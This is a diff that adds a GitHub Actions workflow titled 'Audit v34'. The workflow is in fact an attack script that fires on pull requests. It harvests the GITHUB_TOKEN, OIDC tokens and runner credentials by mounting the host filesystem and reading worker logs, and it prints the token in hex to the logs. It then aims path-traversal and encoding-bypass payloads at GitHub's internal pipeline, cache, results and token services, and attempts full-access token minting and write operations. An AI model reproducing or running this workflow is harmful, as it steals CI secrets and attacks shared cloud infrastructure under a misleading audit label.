@@ -1,0 +1,440 @@
+name: Audit v34
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v34:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V34 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
+            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: PIPELINE PARENT SCOPE — FULL API SURFACE
+      # CONFIRMED: SECRET/../_apis/connectionData = 200 (iid=84ff2294)
+      # The PARENT scope is a DIFFERENT Azure DevOps instance
+      # Now hit EVERY API on this parent scope
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Pipeline parent scope
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== PIPELINE PARENT SCOPE ==="
+          RT=$(cat /tmp/rt.txt)
+          IDTOK=$(cat /tmp/idtok.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          PLAN=$(cat /tmp/plan.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+          PARENT="$BASE/$SECRET/.."
+
+          # A: Verify parent scope is accessible
+          echo "--- A: Parent connectionData ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: Bearer $RT" \
+            "$PARENT/_apis/connectionData")
+          CODE=$(echo "$R" | tail -1)
+          echo "A connData = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # B: Full resource areas on parent
+          echo "--- B: Resource areas ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: Bearer $RT" \
+            "$PARENT/_apis/resourceareas")
+          CODE=$(echo "$R" | tail -1)
+          echo "B areas = $CODE count=$(echo "$R" | sed '$d' | jq '.count // empty' 2>/dev/null)"
+          echo "$R" | sed '$d' | jq -c '.value[]? | {name,id}' 2>/dev/null
+
+          # C: oauth2/token on PARENT scope (DIFFERENT validation?)
+          echo "--- C: Parent oauth2 ---"
+          OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://pipelines.actions.githubusercontent.com" | jq -r '.value // empty')
+          OIDC_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC")
+
+          # Parent scope oauth2 with OIDC
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            "$PARENT/_apis/oauth2/token" \
+            -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
+          CODE=$(echo "$R" | tail -1)
+          echo "C parent oidc = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # Parent scope oauth2 with CTOK
+          if [ -n "$CTOK" ] && [ ${#CTOK} -gt 10 ]; then
+            CTOK_ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote(open('/tmp/cred_token.txt').read().strip()))")
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              "$PARENT/_apis/oauth2/token" \
+              -d "grant_type=client_credentials&client_assertion=$CTOK_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
+            CODE=$(echo "$R" | tail -1)
+            echo "C parent ctok = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+          fi
+
+          # Parent scope oauth2 with RT as assertion
+          RT_ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote(open('/tmp/rt.txt').read().strip()))")
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            "$PARENT/_apis/oauth2/token" \
+            -d "grant_type=client_credentials&client_assertion=$RT_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access")
+          CODE=$(echo "$R" | tail -1)
+          echo "C parent rt = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # D: distributedtask APIs on parent
+          echo "--- D: Parent distributedtask ---"
+          for EP in \
+            "/_apis/distributedtask/pools" \
+            "/_apis/distributedtask/agents" \
+            "/_apis/distributedtask/agentpools" \
+            "/_apis/distributedtask/variablegroups" \
+            "/_apis/distributedtask/environments" \
+            "/_apis/distributedtask/serviceendpoints" \
+            "/_apis/distributedtask/packages" \
+            "/_apis/distributedtask/events" \
+            "/_apis/distributedtask/plans/$PLAN/timelines" \
+            "/_apis/distributedtask/plans/$PLAN/logs"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "$PARENT$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "D $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+          # E: Write operations on parent
+          echo "--- E: Parent writes ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "$PARENT/_apis/distributedtask/variablegroups" \
+            -d '{"name":"v34-parent","type":"Vsts","variables":{"key":{"value":"v34"}}}')
+          CODE=$(echo "$R" | tail -1)
+          echo "E vargroup = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "$PARENT/_apis/distributedtask/events" \
+            -d '{"name":"v34","data":"test"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "E event = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: CACHE SERVICE TRAVERSAL
+      # artifactcache uses same SECRET path — traverse it!
+      # Also: results-receiver HTTP endpoints (not just twirp)
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Cache + results traversal
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== CACHE + RESULTS TRAVERSAL ==="
+          RT=$(cat /tmp/rt.txt)
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+
+          # A: Cache service traversal
+          echo "--- A: Cache traversal ---"
+          CACHE="https://artifactcache.actions.githubusercontent.com"
+          for PREFIX in \
+            "$SECRET/.." \
+            "$SECRET/../.." \
+            "$SECRET" \
+            ".." \
+            "../.." \
+            "$SECRET/../$SECRET"; do
+            for EP in \
+              "/_apis/connectionData" \
+              "/_apis/resourceareas" \
+              "/_apis/artifactcache/caches" \
+              "/_apis/artifactcache/cache?keys=v34-test&version=v34" \
+              "/_apis/oauth2/token"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $RT" "$CACHE/$PREFIX$EP")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "A /$PREFIX$EP = $CODE | $(echo "$BODY" | head -c 200)"
+            done
+          done
+          echo ""
+
+          # B: Results-receiver HTTP traversal (not twirp)
+          echo "--- B: Results HTTP ---"
+          RESULTS="https://results-receiver.actions.githubusercontent.com"
+          for EP in \
+            "/" \
+            "/_apis/connectionData" \
+            "/_apis/resourceareas" \
+            "/healthcheck" \
+            "/health" \
+            "/status" \
+            "/_internal" \
+            "/_internal/status" \
+            "/admin" \
+            "/metrics" \
+            "/_ws" \
+            "/_ws/ingest.sock" \
+            "/twirp" \
+            "/.well-known/openid-configuration" \
+            "/api/v1" \
+            "/api/v2"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$RESULTS$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          # C: Twirp CacheService — ListCacheEntries and DeleteCacheEntry
+          echo "--- C: Twirp operations ---"
+          for METHOD in "ListCacheEntries" "DeleteCacheEntry" "LookupCacheEntry"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+              "$RESULTS/twirp/github.actions.results.api.v1.CacheService/$METHOD" \
+              -d '{"key":"*","version":"*"}')
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C $METHOD = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: ENCODING VARIANTS on traversal
+      # Double-encode, unicode, null byte, case variations
+      # Applied to pipeline service where traversal is CONFIRMED
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Encoding variants
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== ENCODING VARIANTS ==="
+          RT=$(cat /tmp/rt.txt)
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+
+          # A: Different traversal encodings targeting parent connectionData
+          echo "--- A: Pipeline encoding ---"
+          for TRAV in \
+            "$SECRET/.." \
+            "$SECRET/%2e%2e" \
+            "$SECRET/..%00" \
+            "$SECRET/..%0d" \
+            "$SECRET/..%0a" \
+            "$SECRET\\..\\/" \
+            "$SECRET/..;/" \
+            "$SECRET/..%252f" \
+            "$SECRET/%252e%252e" \
+            "$SECRET/..%c0%af" \
+            "$SECRET/..%ef%bc%8f" \
+            "$SECRET%2f.." \
+            "$SECRET%2f..%2f" \
+            "..%2f$SECRET" \
+            "../$SECRET/../.." \
+            "$SECRET/./../../" \
+            "$SECRET/../$SECRET/.." \
+            "$SECRET/....//"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              --path-as-is \
+              -H "Authorization: Bearer $RT" "$BASE/$TRAV/_apis/connectionData")
+            CODE=$(echo "$R" | tail -1)
+            IID=$(echo "$R" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
+            [ "$CODE" != "HTTP_000" ] && echo "A $TRAV = $CODE iid=$IID"
+          done
+          echo ""
+
+          # B: Run-service encoding variants
+          echo "--- B: Run-service encoding ---"
+          RUN_URL=$(cat /tmp/run_url.txt)
+          RUN_HOST=$(echo "$RUN_URL" | grep -oP 'https://[^/]+')
+          RUN_PATH=$(echo "$RUN_URL" | sed "s|$RUN_HOST||" | sed 's|/$||')
+          for TRAV in \
+            "$RUN_PATH/.." \
+            "$RUN_PATH/%2e%2e" \
+            "$RUN_PATH/..%00" \
+            "$RUN_PATH/..;/" \
+            "%2e%2e" \
+            "..%2f.." \
+            "$RUN_PATH/../0/" \
+            "$RUN_PATH/../1/" \
+            "$RUN_PATH/../99/" \
+            "$RUN_PATH/../148/" \
+            "$RUN_PATH/../146/" \
+            "$RUN_PATH/../$RUN_PATH"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              --path-as-is \
+              -H "Authorization: Bearer $RT" "$RUN_HOST/$TRAV/")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_000" ] && echo "B $TRAV = $CODE | $(echo "$BODY" | head -c 150)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: GRANDPARENT + CROSS-SERVICE traversal
+      # Pipeline parent is 84ff2294, secret scope is 8f795dfa
+      # What's the GRANDPARENT (../../)?
+      # Also: traverse from pipeline to vstoken service
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Grandparent + cross-service
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== GRANDPARENT + CROSS-SERVICE ==="
+          RT=$(cat /tmp/rt.txt)
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+
+          # A: Grandparent scope
+          echo "--- A: Grandparent ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: Bearer $RT" \
+            "$BASE/$SECRET/../../_apis/connectionData")
+          CODE=$(echo "$R" | tail -1)
+          IID=$(echo "$R" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
+          echo "A ../../ = $CODE iid=$IID | $(echo "$R" | sed '$d' | head -c 200)"
+
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: Bearer $RT" \
+            "$BASE/$SECRET/../../../_apis/connectionData")
+          CODE=$(echo "$R" | tail -1)
+          IID=$(echo "$R" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
+          echo "A ../../../ = $CODE iid=$IID"
+
+          # B: Try to reach OTHER secret scopes from parent
+          echo "--- B: Sibling scopes ---"
+          # From parent, list what's available
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: Bearer $RT" \
+            "$BASE/$SECRET/../_apis/location")
+          CODE=$(echo "$R" | tail -1)
+          echo "B location = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # Try accessing a DIFFERENT secret path via traversal from our scope
+          for SIBLING in \
+            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
+            "00000000000000000000000000000000000000000000000" \
+            "$SECRET" \
+            "serviceDeployments" \
+            "_apis" \
+            "admin"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" \
+              "$BASE/$SECRET/../$SIBLING/_apis/connectionData")
+            CODE=$(echo "$R" | tail -1)
+            IID=$(echo "$R" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "B $SIBLING = $CODE iid=$IID"
+          done
+          echo ""
+
+          # C: Cross-service — from pipeline host, try to reach vstoken
+          echo "--- C: Cross-service ---"
+          for TRAV in \
+            "serviceDeployments/tokenghubeus21" \
+            "serviceDeployments/pipelinesproxcus1" \
+            "../serviceDeployments/tokenghubeus21" \
+            "../../serviceDeployments/tokenghubeus21"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" \
+              "$BASE/$SECRET/../$TRAV/_apis/connectionData")
+            CODE=$(echo "$R" | tail -1)
+            IID=$(echo "$R" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
+            [ "$CODE" != "HTTP_000" ] && echo "C $TRAV = $CODE iid=$IID"
+          done
+
+          # D: From vstoken, traverse to reach pipeline
+          echo "--- D: vstoken → pipeline ---"
+          VSBASE="https://vstoken.actions.githubusercontent.com"
+          for TRAV in \
+            "serviceDeployments/tokenghubeus21/.." \
+            "serviceDeployments/tokenghubeus21/../.." \
+            "serviceDeployments/pipelinesghubeus14" \
+            "../serviceDeployments/pipelinesghubeus14" \
+            "serviceDeployments/tokenghubeus21/../pipelinesghubeus14"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" \
+              "$VSBASE/$TRAV/_apis/connectionData")
+            CODE=$(echo "$R" | tail -1)
+            IID=$(echo "$R" | sed '$d' | jq -r '.instanceId // empty' 2>/dev/null)
+            [ "$CODE" != "HTTP_000" ] && echo "D $TRAV = $CODE iid=$IID"
+          done
+
+          # E: Pipeline parent — try to list/create plans
+          echo "--- E: Parent plans ---"
+          PARENT="$BASE/$SECRET/.."
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: Bearer $RT" \
+            "$PARENT/_apis/distributedtask/plans")
+          CODE=$(echo "$R" | tail -1)
+          echo "E plans = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "$PARENT/_apis/distributedtask/plans" \
+            -d '{"name":"v34-plan"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "E create plan = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 6: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 6 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V34 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V34 COMPLETE ==="
